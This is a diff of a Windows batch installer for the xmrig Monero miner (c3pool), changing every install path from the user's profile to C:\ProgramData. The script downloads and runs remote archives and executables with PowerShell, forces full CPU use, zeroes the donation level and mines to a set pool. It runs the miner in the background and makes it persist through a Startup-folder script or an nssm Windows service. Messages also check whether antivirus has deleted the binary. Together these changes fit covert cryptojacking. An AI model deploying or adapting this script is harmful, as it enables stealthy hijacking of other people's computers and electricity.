@@ -35,13 +35,13 @@ exit /b 1
 
 :WALLET_LEN_OK
 
-if ["%USERPROFILE%"] == [""] (
-  echo ERROR: Please define USERPROFILE environment variable to your user directory
+if ["C:\ProgramData"] == [""] (
+  echo ERROR: Please make sure C:\ProgramData directory is accessible
   exit /b 1
 )
 
-if not exist "%USERPROFILE%" (
-  echo ERROR: Please make sure user directory %USERPROFILE% exists
+if not exist "C:\ProgramData" (
+  echo ERROR: Please make sure C:\ProgramData directory exists
   exit /b 1
 )
 
@@ -142,10 +142,10 @@ set PORT=80
 
 rem printing intentions
 
-set "LOGFILE=%USERPROFILE%\c3pool\xmrig.log"
+set "LOGFILE=C:\ProgramData\c3pool\xmrig.log"
 
 echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
-echo If needed, miner in foreground can be started by %USERPROFILE%\c3pool\miner.bat script.
+echo If needed, miner in foreground can be started by C:\ProgramData\c3pool\miner.bat script.
 echo Mining will happen to %WALLET% wallet.
 
 if not [%EMAIL%] == [] (
@@ -174,97 +174,97 @@ sc delete c3pool_miner
 taskkill /f /t /im xmrig.exe
 
 :REMOVE_DIR0
-echo [*] Removing "%USERPROFILE%\c3pool" directory
+echo [*] Removing "C:\ProgramData\c3pool" directory
 timeout 5
-rmdir /q /s "%USERPROFILE%\c3pool" >NUL 2>NUL
-IF EXIST "%USERPROFILE%\c3pool" GOTO REMOVE_DIR0
+rmdir /q /s "C:\ProgramData\c3pool" >NUL 2>NUL
+IF EXIST "C:\ProgramData\c3pool" GOTO REMOVE_DIR0
 
-echo [*] Downloading c3pool advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
+echo [*] Downloading c3pool advanced version of xmrig to "C:\ProgramData\xmrig.zip"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/xmrig.zip', 'C:\ProgramData\xmrig.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download c3pool advanced version of xmrig
   goto MINER_BAD
 )
 
-echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\c3pool"
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\c3pool')"
+echo [*] Unpacking "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\ProgramData\xmrig.zip', 'C:\ProgramData\c3pool')"
 if errorlevel 1 (
-  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  echo [*] Downloading 7za.exe to "C:\ProgramData\7za.exe"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', 'C:\ProgramData\7za.exe')"
   if errorlevel 1 (
-    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+    echo ERROR: Can't download 7za.exe to "C:\ProgramData\7za.exe"
     exit /b 1
   )
-  echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\c3pool"
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\xmrig.zip" >NUL
-  del "%USERPROFILE%\7za.exe"
+  echo [*] Unpacking stock "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
+  "C:\ProgramData\7za.exe" x -y -o"C:\ProgramData\c3pool" "C:\ProgramData\xmrig.zip" >NUL
+  del "C:\ProgramData\7za.exe"
 )
-del "%USERPROFILE%\xmrig.zip"
+del "C:\ProgramData\xmrig.zip"
 
-echo [*] Checking if advanced version of "%USERPROFILE%\c3pool\xmrig.exe" works fine ^(and not removed by antivirus software^)
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-"%USERPROFILE%\c3pool\xmrig.exe" --help >NUL
+echo [*] Checking if advanced version of "C:\ProgramData\c3pool\xmrig.exe" works fine ^(and not removed by antivirus software^)
+powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
+"C:\ProgramData\c3pool\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 :MINER_BAD
 
-if exist "%USERPROFILE%\c3pool\xmrig.exe" (
-  echo WARNING: Advanced version of "%USERPROFILE%\c3pool\xmrig.exe" is not functional
+if exist "C:\ProgramData\c3pool\xmrig.exe" (
+  echo WARNING: Advanced version of "C:\ProgramData\c3pool\xmrig.exe" is not functional
 ) else (
-  echo WARNING: Advanced version of "%USERPROFILE%\c3pool\xmrig.exe" was removed by antivirus
+  echo WARNING: Advanced version of "C:\ProgramData\c3pool\xmrig.exe" was removed by antivirus
 )
 
 echo [*] Looking for the latest version of Monero miner
 for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
 set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
 
-echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
+echo [*] Downloading "%MINER_LOCATION%" to "C:\ProgramData\xmrig.zip"
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', 'C:\ProgramData\xmrig.zip')"
 if errorlevel 1 (
-  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
+  echo ERROR: Can't download "%MINER_LOCATION%" to "C:\ProgramData\xmrig.zip"
   exit /b 1
 )
 
 :REMOVE_DIR1
-echo [*] Removing "%USERPROFILE%\c3pool" directory
+echo [*] Removing "C:\ProgramData\c3pool" directory
 timeout 5
-rmdir /q /s "%USERPROFILE%\c3pool" >NUL 2>NUL
-IF EXIST "%USERPROFILE%\c3pool" GOTO REMOVE_DIR1
+rmdir /q /s "C:\ProgramData\c3pool" >NUL 2>NUL
+IF EXIST "C:\ProgramData\c3pool" GOTO REMOVE_DIR1
 
-echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\c3pool"
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\c3pool')"
+echo [*] Unpacking "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\ProgramData\xmrig.zip', 'C:\ProgramData\c3pool')"
 if errorlevel 1 (
-  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  echo [*] Downloading 7za.exe to "C:\ProgramData\7za.exe"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', 'C:\ProgramData\7za.exe')"
   if errorlevel 1 (
-    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+    echo ERROR: Can't download 7za.exe to "C:\ProgramData\7za.exe"
     exit /b 1
   )
-  echo [*] Unpacking advanced "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\c3pool"
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\xmrig.zip" >NUL
+  echo [*] Unpacking advanced "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
+  "C:\ProgramData\7za.exe" x -y -o"C:\ProgramData\c3pool" "C:\ProgramData\xmrig.zip" >NUL
   if errorlevel 1 (
-    echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\c3pool"
+    echo ERROR: Can't unpack "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
     exit /b 1
   )
-  del "%USERPROFILE%\7za.exe"
+  del "C:\ProgramData\7za.exe"
 )
-del "%USERPROFILE%\xmrig.zip"
+del "C:\ProgramData\xmrig.zip"
 
-echo [*] Checking if stock version of "%USERPROFILE%\c3pool\xmrig.exe" works fine ^(and not removed by antivirus software^)
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-"%USERPROFILE%\c3pool\xmrig.exe" --help >NUL
+echo [*] Checking if stock version of "C:\ProgramData\c3pool\xmrig.exe" works fine ^(and not removed by antivirus software^)
+powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
+"C:\ProgramData\c3pool\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
 
-if exist "%USERPROFILE%\c3pool\xmrig.exe" (
-  echo WARNING: Stock version of "%USERPROFILE%\c3pool\xmrig.exe" is not functional
+if exist "C:\ProgramData\c3pool\xmrig.exe" (
+  echo WARNING: Stock version of "C:\ProgramData\c3pool\xmrig.exe" is not functional
 ) else (
-  echo WARNING: Stock version of "%USERPROFILE%\c3pool\xmrig.exe" was removed by antivirus
+  echo WARNING: Stock version of "C:\ProgramData\c3pool\xmrig.exe" was removed by antivirus
 )
 
 exit /b 1
 
 :MINER_OK
 
-echo [*] Miner "%USERPROFILE%\c3pool\xmrig.exe" is OK
+echo [*] Miner "C:\ProgramData\c3pool\xmrig.exe" is OK
 
 for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
 if [%PASS%] == [] (
@@ -274,15 +274,15 @@ if not [%EMAIL%] == [] (
   set "PASS=%PASS%:%EMAIL%"
 )
 
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"pool.supportxmr.com:3333\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"pool.supportxmr.com:3333\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
+powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
+powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
+powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
+powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
 
-copy /Y "%USERPROFILE%\c3pool\config.json" "%USERPROFILE%\c3pool\config_background.json" >NUL
-powershell -Command "$out = cat '%USERPROFILE%\c3pool\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config_background.json'" 
+copy /Y "C:\ProgramData\c3pool\config.json" "C:\ProgramData\c3pool\config_background.json" >NUL
+powershell -Command "$out = cat 'C:\ProgramData\c3pool\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config_background.json'" 
 
 rem preparing script
 (
@@ -295,18 +295,18 @@ echo :ALREADY_RUNNING
 echo echo Monero miner is already running in the background. Refusing to run another one.
 echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
 echo :EXIT
-) > "%USERPROFILE%\c3pool\miner.bat"
+) > "C:\ProgramData\c3pool\miner.bat"
 
 rem preparing script background work and work under reboot
 
 if %ADMIN% == 1 goto ADMIN_MINER_SETUP
 
-if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
-  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+if exist "C:\ProgramData\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=C:\ProgramData\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
   goto STARTUP_DIR_OK
 )
-if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
-  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
+if exist "C:\ProgramData\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=C:\ProgramData\Start Menu\Programs\Startup"
   goto STARTUP_DIR_OK  
 )
 
@@ -314,10 +314,10 @@ echo ERROR: Can't find Windows startup directory
 exit /b 1
 
 :STARTUP_DIR_OK
-echo [*] Adding call to "%USERPROFILE%\c3pool\miner.bat" script to "%STARTUP_DIR%\c3pool_miner.bat" script
+echo [*] Adding call to "C:\ProgramData\c3pool\miner.bat" script to "%STARTUP_DIR%\c3pool_miner.bat" script
 (
 echo @echo off
-echo "%USERPROFILE%\c3pool\miner.bat" --config="%USERPROFILE%\c3pool\config_background.json"
+echo "C:\ProgramData\c3pool\miner.bat" --config="C:\ProgramData\c3pool\config_background.json"
 ) > "%STARTUP_DIR%\c3pool_miner.bat"
 
 echo [*] Running miner in the background
@@ -326,54 +326,54 @@ goto OK
 
 :ADMIN_MINER_SETUP
 
-echo [*] Downloading tools to make c3pool_miner service to "%USERPROFILE%\nssm.zip"
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
+echo [*] Downloading tools to make c3pool_miner service to "C:\ProgramData\nssm.zip"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/nssm.zip', 'C:\ProgramData\nssm.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download tools to make c3pool_miner service
   exit /b 1
 )
 
-echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\c3pool"
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\c3pool')"
+echo [*] Unpacking "C:\ProgramData\nssm.zip" to "C:\ProgramData\c3pool"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\ProgramData\nssm.zip', 'C:\ProgramData\c3pool')"
 if errorlevel 1 (
-  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
+  echo [*] Downloading 7za.exe to "C:\ProgramData\7za.exe"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', 'C:\ProgramData\7za.exe')"
   if errorlevel 1 (
-    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+    echo ERROR: Can't download 7za.exe to "C:\ProgramData\7za.exe"
     exit /b 1
   )
-  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\c3pool"
-  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\nssm.zip" >NUL
+  echo [*] Unpacking "C:\ProgramData\nssm.zip" to "C:\ProgramData\c3pool"
+  "C:\ProgramData\7za.exe" x -y -o"C:\ProgramData\c3pool" "C:\ProgramData\nssm.zip" >NUL
   if errorlevel 1 (
-    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\c3pool"
+    echo ERROR: Can't unpack "C:\ProgramData\nssm.zip" to "C:\ProgramData\c3pool"
     exit /b 1
   )
-  del "%USERPROFILE%\7za.exe"
+  del "C:\ProgramData\7za.exe"
 )
-del "%USERPROFILE%\nssm.zip"
+del "C:\ProgramData\nssm.zip"
 
 echo [*] Creating c3pool_miner service
 sc stop c3pool_miner
 sc delete c3pool_miner
-"%USERPROFILE%\c3pool\nssm.exe" install c3pool_miner "%USERPROFILE%\c3pool\xmrig.exe"
+"C:\ProgramData\c3pool\nssm.exe" install c3pool_miner "C:\ProgramData\c3pool\xmrig.exe"
 if errorlevel 1 (
   echo ERROR: Can't create c3pool_miner service
   exit /b 1
 )
-"%USERPROFILE%\c3pool\nssm.exe" set c3pool_miner AppDirectory "%USERPROFILE%\c3pool"
-"%USERPROFILE%\c3pool\nssm.exe" set c3pool_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
-"%USERPROFILE%\c3pool\nssm.exe" set c3pool_miner AppStdout "%USERPROFILE%\c3pool\stdout"
-"%USERPROFILE%\c3pool\nssm.exe" set c3pool_miner AppStderr "%USERPROFILE%\c3pool\stderr"
+"C:\ProgramData\c3pool\nssm.exe" set c3pool_miner AppDirectory "C:\ProgramData\c3pool"
+"C:\ProgramData\c3pool\nssm.exe" set c3pool_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
+"C:\ProgramData\c3pool\nssm.exe" set c3pool_miner AppStdout "C:\ProgramData\c3pool\stdout"
+"C:\ProgramData\c3pool\nssm.exe" set c3pool_miner AppStderr "C:\ProgramData\c3pool\stderr"
 
 echo [*] Starting c3pool_miner service
-"%USERPROFILE%\c3pool\nssm.exe" start c3pool_miner
+"C:\ProgramData\c3pool\nssm.exe" start c3pool_miner
 if errorlevel 1 (
   echo ERROR: Can't start c3pool_miner service
   exit /b 1
 )
 
 echo
-echo Please reboot system if c3pool_miner service is not activated yet (if "%USERPROFILE%\c3pool\xmrig.log" file is empty)
+echo Please reboot system if c3pool_miner service is not activated yet (if "C:\ProgramData\c3pool\xmrig.log" file is empty)
 goto OK
 
 :OK
@@ -391,8 +391,3 @@ for /L %%A in (12,-1,0) do (
 )
 endlocal & set %~2=%len%
 exit /b
-
-
-
-
-
